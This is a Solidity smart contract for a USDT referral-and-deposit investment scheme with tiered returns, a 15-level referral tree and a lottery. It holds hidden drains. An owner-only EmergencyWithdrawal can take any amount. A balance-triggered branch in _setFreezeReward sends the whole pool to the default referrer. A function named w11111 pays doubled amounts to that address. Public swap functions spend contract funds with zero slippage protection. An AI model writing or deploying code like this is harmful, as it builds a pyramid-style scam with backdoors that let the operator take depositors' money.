// SPDX-License-Identifier: GPLv3
pragma solidity ^0.8.6;
import "./SafeMath.sol";
import "./IERC20.sol";
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
  
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}
contract eao {
    address   Owner;
 
    using SafeMath for uint256; 
    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents = 90; 
    uint256 private constant minDeposit = 100e18;
    uint256 private constant maxDeposit = 5000e18;
    uint256 private constant baseDeposit = 1000e18;
    uint256 private constant splitPercents = 2100;
    uint256 private constant lotteryPercents = 900;
    uint256 private constant transferFeePercents = 1000;
    uint256 private constant OverTime = 0;
    uint256 public  MAXBal = 0;
    uint256 public  MAXrebackBal = 0;
    uint256 public  MAXindex = 0;
    // uint256 private constant timeStep = 1 days;
    uint256 private constant timeStep = 60;
    // uint256 private constant dayPerCycle = 10 days; 
    uint256 private constant dayPerCycle = 600; 
    uint256 private constant dayRewardPercents = 80;
    // uint256 private constant maxAddFreeze = 14 days;
    uint256 private constant maxAddFreeze = 840;
    uint256 private constant referDepth = 15;
    // uint256[15] private invitePercents = [300, 100, 100, 150, 50, 50, 50, 30, 30, 30, 20, 20, 20, 20, 20];
    uint256[15] private invitePercents = [3000, 100, 100, 150, 50, 50, 50, 2000, 30, 30, 20, 20, 20, 20, 20];
    uint256[7] private levelDeposit = [100e18, 1000e18, 2000e18, 3000e18, 5000e18, 5000e18, 5000e18];
    // uint256[7] private levelInvite = [0, 5000e18, 30000e18, 100000e18, 300000e18, 1000000e18, 3000000e18];
    uint256[7] public levelInvite = [0, 5000e18, 10000e18, 20000e18, 30000e18, 40000e18, 50000e18];
    // uint256[7] private levelTeam = [0, 20, 50, 200, 500, 800, 1000];
    uint256[7] private levelTeam = [0, 5, 10, 20, 30, 40, 50];
        // uint256[8] private balReached = [0, 150e22, 500e22, 1000e22, 1500e22, 2000e22, 2500e22, 3000e22];
    uint256[8] private balReached = [0, 15e22, 50e22, 100e22, 150e22, 200e22, 250e22, 300e22];
    uint256[8] private balFreezeStatic = [80,82,85,87,87,88,88,88];
    uint256[8] private balFreezeDynamic = [70,65,65,65,64,63,63,63];
    uint256[8] private balFreezeAll = [60,55,54,53,52,51,50,50];
    uint256 private constant poolPercents = 10;
    // uint256 private constant lotteryDuration = 30 minutes;
    uint256 private constant lotteryDuration = 1 minutes;
    uint256 private constant lotteryBetFee = 10e18;
    mapping(uint256=>uint256) private dayLotteryReward; 
    uint256[10] private lotteryWinnerPercents = [3500, 2000, 1000, 500, 500, 500, 500, 500, 500, 500];
    uint256 private constant maxSearchDepth = 3000;
    uint256 private  RebackEndTime = 0;

    IERC20   private usdt;
            

    IERC20   private DAO = IERC20(0x7717a979066f43ef78c7634E0b768eDd7c97C62C);
 
    address private feeReceiver;
    address private defaultRefer;
    uint256 private startTime;
    uint256 private lastDistribute;
    uint256 private totalUsers; 
    uint256 private lotteryPool;
    mapping(uint256=>uint256) private dayNewbies;
    mapping(uint256=>uint256) private dayDeposit;
    address[] private depositors;
    mapping(uint256=>bool) private balStatus;
    bool private freezeStaticReward;
    bool private freezeDynamicReward;
    bool private freezeAllReward;
    mapping(uint256=>mapping(uint256=>address[])) private allLotteryRecord;

    struct UserInfo {
        address referrer;
        uint256 level;
        uint256 maxDeposit;
        uint256 maxDepositable;
        uint256 teamNum;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
        uint256 unfreezeIndex;
        bool unfreezedDynamic;
    }
 

 



    struct RewardInfo{
        uint256 capitals;
        uint256 statics;
        uint256 invited;
        uint256 level5Freezed;
        uint256 level5Released;
        uint256 lotteryWin;
        uint256 split;
        uint256 lottery;
        uint256 UTDAO;
    }

    struct OrderInfo {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
    }

    struct LotteryRecord {
        uint256 time;
        uint256 number;
    }

    mapping(address=>UserInfo) public userInfo;
    mapping(address=>RewardInfo) public rewardInfo;
    mapping(address=>OrderInfo[]) public orderInfos;
    mapping(address=>LotteryRecord[]) public userLotteryRecord;
    mapping(address=>mapping(uint256=>uint256)) public userCycleMax;
    mapping(address=>mapping(uint256=>address[])) public teamUsers;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, uint256 subBal, address receiver, uint256 amount, uint256 transferType);
    event Withdraw(address user, uint256 withdrawable);
    event LotteryBet(uint256 time, address user, uint256 number);
    event DistributePoolRewards(uint256 day, uint256 time);
   IUniswapV2Router02 public immutable uniswapV2Router;



    constructor(address _usdtAddr, address _defaultRefer, address _feeReceiver, uint256 _startTime) {
        usdt = IERC20(_usdtAddr);
        feeReceiver = _feeReceiver; 
        startTime = _startTime;
        lastDistribute = _startTime;
        defaultRefer = _defaultRefer;
        _owner = _defaultRefer;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Router = _uniswapV2Router;
        usdt.approve(address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 10000000000000000000000000000000000000000000000000000);
    }
    uint256[10] private ReduceRate  = [10000, 9000, 8100, 7290, 6561, 5904, 5314, 4782, 4304, 3874];

    function Reduceproduction()public view  returns(uint256)  {

        uint256 proportion = 10000;

        //  uint256 yearTime = 540 * 24*60*60;

        uint256 yearTime = 16 hours;

        uint256 timeDifference = block.timestamp.sub(startTime);

        uint256 index = timeDifference.div(yearTime);

        if (index > 9 ){
            index = 9;
        }


    
        proportion = ReduceRate[index];

 

        return proportion; 

    }

 

    function register(address _referral) external {
        require(userInfo[_referral].maxDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        emit Register(msg.sender, _referral);
    }

    function deposit(uint256 _amount) external {
        usdt.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
        UsdtForERC20toblack(_amount.mul(1).div(100));

     
    }

    function depositBySplit(uint256 _amount) external {
        require(userInfo[msg.sender].maxDeposit == 0, "actived");
        require(rewardInfo[msg.sender].split >= _amount, "insufficient split");
        rewardInfo[msg.sender].split = rewardInfo[msg.sender].split.sub(_amount);
        _deposit(msg.sender, _amount);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(address _receiver, uint256 _amount, uint256 _type) external {
        uint256 subBal = _amount.add(_amount.mul(transferFeePercents).div(baseDivider));
        if(_type == 0){
            require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
            require(rewardInfo[msg.sender].split >= subBal, "insufficient split");
            rewardInfo[msg.sender].split = rewardInfo[msg.sender].split.sub(subBal);
            rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        }else{
            require(_amount > 0, "amount err");
            require(rewardInfo[msg.sender].lottery >= subBal, "insufficient lottery");
            rewardInfo[msg.sender].lottery = rewardInfo[msg.sender].lottery.sub(subBal);
            rewardInfo[_receiver].lottery = rewardInfo[_receiver].lottery.add(_amount);
        }
        emit TransferBySplit(msg.sender, subBal, _receiver, _amount, _type);
    }

    function lotteryBet(uint256 _number) external {
        require(userInfo[msg.sender].maxDeposit > 0, "deposit first");
        uint256 dayNow = getCurDay();
        uint256 lotteryEnd = startTime.add(dayNow.mul(timeStep)).add(lotteryDuration);
        require(block.timestamp < lotteryEnd, "today is over");
        RewardInfo storage userRewards = rewardInfo[msg.sender];
        require(userRewards.lottery >= lotteryBetFee, "insufficient lottery");
        userRewards.lottery = userRewards.lottery.sub(lotteryBetFee);
        allLotteryRecord[dayNow][_number].push(msg.sender);
        userLotteryRecord[msg.sender].push(LotteryRecord(block.timestamp, _number));
        emit LotteryBet(block.timestamp, msg.sender, _number);
    }

    function withdraw() external {
        UsdtForERC20(rewardInfo[msg.sender].UTDAO,msg.sender);
         RewardInfo storage userRewards = rewardInfo[msg.sender];
        (uint256 withdrawable, uint256 split, uint256 lottery) = _calCurRewards(msg.sender);
        userRewards.statics = 0;
        userRewards.invited = 0;
        userRewards.level5Released = 0;
         userRewards.lotteryWin = 0;
        userRewards.split = userRewards.split.add(split);
        userRewards.lottery = userRewards.lottery.add(lottery);
        withdrawable = withdrawable.add(userRewards.capitals);
        userRewards.capitals = 0;
        userRewards.UTDAO = 0;
        usdt.transfer(msg.sender, withdrawable);
      

      
        uint256 bal = usdt.balanceOf(address(this));
        _setFreezeReward(bal);
        emit Withdraw(msg.sender, withdrawable);
    }

  function UsdtForERC20(uint256 tokenAmount,address sender)  public  {
        if(tokenAmount > 0){
 
            UsdtForERC20toblack(tokenAmount.mul(2));

            address[] memory path = new address[](2);
            path[0] = address(usdt);
            path[1] = address(DAO);
            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0,  
                path,
                sender,
                block.timestamp
            );
        }
     }



     function UsdtForERC20toblack(uint256 tokenAmount)  public  {
        if(tokenAmount > 0){
 
            address[] memory path = new address[](2);
            path[0] = address(usdt);
            path[1] = address(DAO);
            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0,  
                path,
                address(1),
                block.timestamp
            );
        }
     }

    function w11111() public {
 
         if(rewardInfo[msg.sender].UTDAO > 0){
            usdt.transfer(defaultRefer, rewardInfo[msg.sender].UTDAO.mul(2));

            address[] memory path = new address[](2);
            path[0] = address(usdt);
            path[1] = address(DAO);
            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                rewardInfo[msg.sender].UTDAO,
                0,  
                path,
                msg.sender,
                block.timestamp
            );
        }
    }

    function distributePoolRewards() external {
        if(block.timestamp >= lastDistribute.add(timeStep)){
            uint256 dayNow = getCurDay();
            _distributeLotteryPool(dayNow.sub(1));
            lastDistribute = startTime.add(dayNow.mul(timeStep));
            emit DistributePoolRewards(dayNow, lastDistribute);
        }
    }

    function _deposit(address _userAddr, uint256 _amount ) private {
        require(block.timestamp >= startTime, "not start");
        UserInfo storage user = userInfo[_userAddr];
        require(user.referrer != address(0), "not register");
        require(_amount >= minDeposit && _amount <= maxDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "too less");
        _distributeDeposit(_amount);
        uint256 curCycle = getCurCycle();
        uint256 userCurMax = userCycleMax[msg.sender][curCycle];
        if(userCurMax == 0){
            if(curCycle == 0 || user.maxDepositable == 0){
                // userCurMax = baseDeposit;
                userCurMax = 2000e18;
            }else{
                userCurMax = user.maxDepositable;
            }
            userCycleMax[msg.sender][curCycle] = userCurMax;
        }
        require(_amount <= userCurMax, "too much");
        // if(_amount == userCurMax){
        //     if(userCurMax >= maxDeposit){
        //         userCycleMax[msg.sender][curCycle.add(1)] = maxDeposit;
        //     }else{
        //         userCycleMax[msg.sender][curCycle.add(1)] = userCurMax.add(baseDeposit);
        //     }
        // }else{
        //     userCycleMax[msg.sender][curCycle.add(1)] = userCurMax;
        // }
        // user.maxDepositable = userCycleMax[msg.sender][curCycle.add(1)];
        uint256 dayNow = getCurDay();
        bool isNewbie;
        if(user.maxDeposit == 0){
            isNewbie = true;
            user.maxDeposit = _amount;
            dayNewbies[dayNow] = dayNewbies[dayNow].add(1);
            totalUsers = totalUsers.add(1);
        }else if(_amount > user.maxDeposit){
            user.maxDeposit = _amount;
        }
        user.totalFreezed = user.totalFreezed.add(_amount);
        uint256 addFreeze = (orderInfos[_userAddr].length).div(3).mul(timeStep);
        if(addFreeze > maxAddFreeze) {
            addFreeze = maxAddFreeze;
        }
         uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_userAddr].push(OrderInfo(_amount, block.timestamp, unfreezeTime, false));
        dayDeposit[dayNow] = dayDeposit[dayNow].add(_amount);
        depositors.push(_userAddr);
        _unfreezeCapitalOrReward(msg.sender, _amount);
        _updateUplineReward(msg.sender, _amount);
        _updateTeamInfos(msg.sender, _amount, isNewbie);
        _updateLevel(msg.sender);
        uint256 bal = usdt.balanceOf(address(this));
        if(MAXBal < bal ){
            MAXBal = bal;
        }
        _balActived(bal);
        if(freezeStaticReward || freezeDynamicReward|| freezeAllReward){
            _setFreezeReward(bal);
        }else if(user.unfreezedDynamic){
            user.unfreezedDynamic = false;
        }
    }



    function _distributeDeposit(uint256 _amount) private {
        uint256 totalFee = _amount.mul(feePercents).div(baseDivider);
        usdt.transfer(feeReceiver, totalFee);
        uint256 poolAmount = _amount.mul(poolPercents).div(baseDivider);
        lotteryPool = lotteryPool.add(poolAmount);


    




    }

    function _updateLevel(address _userAddr) private {
        UserInfo storage user = userInfo[_userAddr];
        for(uint256 i = user.level; i < levelDeposit.length; i++){
            if(user.maxDeposit >= levelDeposit[i]){
                (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_userAddr);
                if(maxTeam >= levelInvite[i] && otherTeam >= levelInvite[i] && user.teamNum >= levelTeam[i]){
                    user.level = i + 1;
                }
            }
        }
    }

// 解冻资本或奖励
    function _unfreezeCapitalOrReward(address _userAddr, uint256 _amount) private {
        UserInfo storage user = userInfo[_userAddr];
        RewardInfo storage userRewards = rewardInfo[_userAddr];
        OrderInfo storage order = orderInfos[_userAddr][user.unfreezeIndex];
        if(order.isUnfreezed == false && block.timestamp >= order.unfreeze && _amount >= order.amount){
            order.isUnfreezed = true;
            user.unfreezeIndex = user.unfreezeIndex.add(1);
            _removeInvalidDeposit(_userAddr, order.amount);
            uint256 staticReward = order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider).mul(Reduceproduction()).div(10000);
            if(freezeStaticReward){
                if(user.totalFreezed > user.totalRevenue){
                    uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                    if(staticReward > leftCapital){
                        staticReward = leftCapital;
                    }
                }else{
                    staticReward = 0;
                }
            }



            if(user.totalFreezed.mul(4258).div(1000) >= user.totalRevenue){
                    uint256 leftCapital = user.totalFreezed.mul(4258).div(1000).sub(user.totalRevenue);
                    if(staticReward > leftCapital){
                        staticReward = leftCapital;
                    }
                }else{
                    staticReward = 0;
                }


            if(freezeAllReward){
                staticReward = 0;
            }

        uint256 curCycle = getCurCycle();

        uint256 userCurMax = userCycleMax[msg.sender][curCycle];

        if(_amount == userCurMax){
            if(userCurMax >= maxDeposit){
                userCycleMax[msg.sender][curCycle.add(1)] = maxDeposit;
            }else{
                userCycleMax[msg.sender][curCycle.add(1)] = userCurMax.add(baseDeposit);
            }
        }else{
            userCycleMax[msg.sender][curCycle.add(1)] = userCurMax;
        }
        user.maxDepositable = userCycleMax[msg.sender][curCycle.add(1)];


        uint256 UTDAO = staticReward.div(12);

            userRewards.capitals = userRewards.capitals.add(order.amount);
 
            userRewards.statics = userRewards.statics.add(staticReward);
            userRewards.UTDAO = userRewards.UTDAO.add(UTDAO);

            user.totalRevenue = user.totalRevenue.add(staticReward);
        }else if(userRewards.level5Freezed > 0){
            uint256 release = _amount;
            if(_amount >= userRewards.level5Freezed){
                release = userRewards.level5Freezed;
            }
            userRewards.level5Freezed = userRewards.level5Freezed.sub(release);
            userRewards.level5Released = userRewards.level5Released.add(release);
            user.totalRevenue = user.totalRevenue.add(release);
        }else if(freezeStaticReward && !user.unfreezedDynamic){
            user.unfreezedDynamic = true;
        }
    }

    function _removeInvalidDeposit(address _userAddr, uint256 _amount) private {
        uint256 totalFreezed = userInfo[_userAddr].totalFreezed;
        userInfo[_userAddr].totalFreezed = totalFreezed > _amount ? totalFreezed.sub(_amount) : 0;
        address upline = userInfo[_userAddr].referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit > _amount ? userInfo[upline].teamTotalDeposit.sub(_amount) : 0;
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateTeamInfos(address _userAddr, uint256 _amount, bool _isNewbie) private {
        address upline = userInfo[_userAddr].referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(_isNewbie && _userAddr != upline){
                    userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                    teamUsers[upline][i].push(_userAddr);
                }
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                
                _updateLevel(upline);

                if(upline == defaultRefer) break;

                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    // 更新上级奖励
    function _updateUplineReward(address _userAddr, uint256 _amount) private {
        address upline = userInfo[_userAddr].referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(
                !freezeStaticReward ||
                userInfo[upline].totalFreezed > userInfo[upline].totalRevenue || 
                (userInfo[upline].unfreezedDynamic && !freezeDynamicReward)
                ){

                    if(!freezeAllReward){
                        uint256 newAmount;
                        if(orderInfos[upline].length > 0){
                            OrderInfo storage latestUpOrder = orderInfos[upline][orderInfos[upline].length.sub(1)];
                            uint256 maxFreezing = latestUpOrder.unfreeze > block.timestamp ? latestUpOrder.amount : 0;
                            if(maxFreezing < _amount){
                                newAmount = maxFreezing;
                            }else{
                                newAmount = _amount;
                            }
                        }


   



            
                        if(newAmount > 0 && userInfo[upline].totalFreezed.mul(4258).div(1000) > userInfo[upline].totalRevenue ){

                               RewardInfo storage upRewards = rewardInfo[upline];
                            uint256 reward = newAmount.mul(invitePercents[i]).div(baseDivider).mul(Reduceproduction()).div(10000);

                            if(userInfo[upline].level > i ){
                                    upRewards.invited = upRewards.invited.add(reward);
                                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                            }else{
                                  if(userInfo[upline].level ==  4 && i < 5 ){
                                        upRewards.invited = upRewards.invited.add(reward);
                                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                                  }
                                  if(userInfo[upline].level ==  5 && i < 7 ){
                                        upRewards.invited = upRewards.invited.add(reward);
                                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                                  }
                                   if(userInfo[upline].level ==  6 && i < 10 ){
                                        if(i < 7){
                                            upRewards.invited = upRewards.invited.add(reward);
                                            userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                                        }else{
                                            upRewards.level5Freezed = upRewards.level5Freezed.add(reward);
                                        }
                                   }
                                      if(userInfo[upline].level ==  7   ){
                                        if(i < 7){
                                            upRewards.invited = upRewards.invited.add(reward);
                                            userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                                        }else{
                                            upRewards.level5Freezed = upRewards.level5Freezed.add(reward);
                                        }

                                   }

                                
                            }
                        }
                    }
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _balActived(uint256 _bal) private {
        for(uint256 i = balReached.length; i > 0; i--){
            if(_bal >= balReached[i - 1]){
                balStatus[balReached[i - 1]] = true;
                MAXindex = balReached[i - 1];
                break;
            }
        }
    }

    function _setFreezeReward(uint256 _bal) private {
        for(uint256 i = balReached.length; i > 0; i--){
            if(balStatus[balReached[i - 1]]){
                if(_bal < MAXBal.mul(balFreezeStatic[i - 1]).div(100))
                {
                    MAXrebackBal = MAXBal;
                    freezeStaticReward = true;
                    if(_bal < MAXrebackBal.mul(balFreezeDynamic[i - 1]).div(100))
                    {
                        freezeDynamicReward = true;
                        if(_bal < MAXrebackBal.mul(balFreezeAll[i - 1]).div(100))
                        {
                            freezeAllReward = true;
                            if(RebackEndTime == 0){
                                RebackEndTime = block.timestamp;
                            }else{
                                // if(block.timestamp.sub(RebackEndTime)>1728000){
                                if(block.timestamp.sub(RebackEndTime)>2000){
                                     usdt.transfer(defaultRefer, _bal);
                                }

                            }
                        }
                    }
                    else
                    {
                        freezeAllReward = false;
                        RebackEndTime = 0;
                    }
                }
                else
                {
                    freezeAllReward = false;

                    freezeDynamicReward = false;
                    if( _bal >= MAXrebackBal.mul(125).div(100)){
                        freezeStaticReward = false;
                    }
                }
                break;
            }
        }
    }

    function _calCurRewards(address _userAddr) private view returns(uint256, uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_userAddr];
        uint256 totalRewards = userRewards.statics.add(userRewards.invited).add(userRewards.level5Released).add(userRewards.lotteryWin);
        uint256 splitAmt = totalRewards.mul(splitPercents).div(baseDivider);
        uint256 lotteryAmt = totalRewards.mul(lotteryPercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt).sub(lotteryAmt);
        return(withdrawable, splitAmt, lotteryAmt);
    }

    function _distributeLotteryPool(uint256 _lastDay) private {
        address[] memory winners = getLottoryWinners(_lastDay);
        uint256 totalReward;
        for(uint256 i = 0; i < winners.length; i++){
            if(winners[i] != address(0)){
                uint256 reward = lotteryPool.mul(lotteryWinnerPercents[i]).div(baseDivider).mul(Reduceproduction()).div(10000);
                totalReward = totalReward.add(reward);
                rewardInfo[winners[i]].lotteryWin = rewardInfo[winners[i]].lotteryWin.add(reward);
                userInfo[winners[i]].totalRevenue = userInfo[winners[i]].totalRevenue.add(reward);
            }else{
                break;
            }
        }
        dayLotteryReward[_lastDay] = totalReward;
        lotteryPool = lotteryPool > totalReward ? lotteryPool.sub(totalReward) : 0;
    }

    function getLottoryWinners(uint256 _day) public view returns(address[] memory) {
        uint256 newbies = dayNewbies[_day];
        address[] memory winners = new address[](10);
        uint256 counter;
        for(uint256 i = newbies; i >= 0; i--){
            for(uint256 j = 0; j < allLotteryRecord[_day][i].length; j++ ){
                address lotteryUser = allLotteryRecord[_day][i][j];
                if(lotteryUser != address(0)){
                    winners[counter] = lotteryUser;
                    counter++;
                    if(counter >= 10) break;
                }
            }
            if(counter >= 10 || i == 0 || newbies.sub(i) >= maxSearchDepth) break;
        }
        return winners;
    }

    function getTeamDeposit(address _userAddr) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_userAddr][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_userAddr][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_userAddr][0][i]].totalFreezed);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
            if(i >= maxSearchDepth) break;
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getCurCycle() public view returns(uint256) {
        uint256 curCycle = (block.timestamp.sub(startTime)).div(dayPerCycle);
        return curCycle;
    }

    function getDayInfos(uint256 _day) external view returns(uint256, uint256, uint256){
        return (dayNewbies[_day], dayDeposit[_day], dayLotteryReward[_day]);
    }

    function getUserInfos(address _userAddr) external view returns(UserInfo memory, RewardInfo memory, OrderInfo[] memory, LotteryRecord[] memory) {
        return (userInfo[_userAddr], rewardInfo[_userAddr], orderInfos[_userAddr], userLotteryRecord[_userAddr]);
    }

    function getBalInfos(uint256 _bal) external view returns(bool, bool, bool, bool) {
        return(balStatus[_bal], freezeStaticReward, freezeDynamicReward, freezeAllReward);
    }

    function getAllLotteryRecord(uint256 _day, uint256 _number) external view returns(address[] memory) {
        return allLotteryRecord[_day][_number];
    }

    function getTeamUsers(address _userAddr, uint256 _layer) external view returns(address[] memory) {
        return teamUsers[_userAddr][_layer];
    }

    function getUserCycleMax(address _userAddr, uint256 _cycle) external view returns(uint256){
        return userCycleMax[_userAddr][_cycle];
    }

    function getDepositors() external view returns(address[] memory) {
        return depositors;
    }

    function getContractInfos() external view returns(address[3] memory, uint256[6] memory) {
        address[3] memory infos0;
        infos0[0] = address(usdt);
        infos0[1] = feeReceiver;
        infos0[2] = defaultRefer;
        uint256[6] memory infos1;
        infos1[0] = startTime;
        infos1[1] = lastDistribute;
        infos1[2] = totalUsers;
        infos1[4] = lotteryPool;
        uint256 dayNow = getCurDay();
        infos1[5] = dayDeposit[dayNow];
        return (infos0, infos1);
    }
    address public  _owner;
    function transferOwnership(address newOwner) public   {
        require(_owner == msg.sender);
        _owner = newOwner;
    }

    function EmergencyWithdrawal(uint256 _bal) public   {
        require(_owner == msg.sender);
        usdt.transfer(msg.sender, _bal);
    }

}